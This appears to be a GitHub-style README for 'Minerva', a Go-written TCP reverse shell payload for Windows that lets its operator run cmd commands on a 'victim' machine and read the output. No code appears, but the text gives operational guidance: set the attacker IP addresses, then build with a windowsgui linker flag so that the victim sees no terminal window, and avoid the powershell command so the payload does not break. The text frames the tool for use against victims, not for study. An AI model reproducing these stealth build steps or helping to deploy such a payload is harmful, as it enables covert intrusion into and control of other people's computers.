# TCP Reverse Shell Payload
Minerva is a payload which is TCP reverse shell and for Windows OS and written by using Golang.     
You can send cmd commands to the computer of victim and take the output of the cmd commands.           


# Important information
Before making it an executable file, you should change the ip addresses on files and build it by using "go build -ldflags "-H windowsgui" target-payload.go"".     
If you build it by using that command, victim will not be able to see terminal.
Do not use "powershell" command because if you use it, the payload will be broken.
